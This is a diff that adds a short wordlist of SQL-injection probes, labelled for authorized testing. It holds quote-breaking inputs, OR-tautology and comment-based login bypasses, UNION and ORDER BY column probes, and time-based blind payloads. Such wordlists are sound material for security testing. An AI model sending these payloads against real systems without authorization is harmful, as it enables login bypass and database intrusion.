@@ -1,0 +1,20 @@
+# SQL-injection probes for authorized testing of your own targets.
+'
+"
+')
+")
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+' OR '1'='1'--
+admin'--
+admin' #
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+1' ORDER BY 1--
+1' ORDER BY 100--
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+1 AND 1=1
+1 AND 1=2
+%27%20OR%20%271%27%3D%271
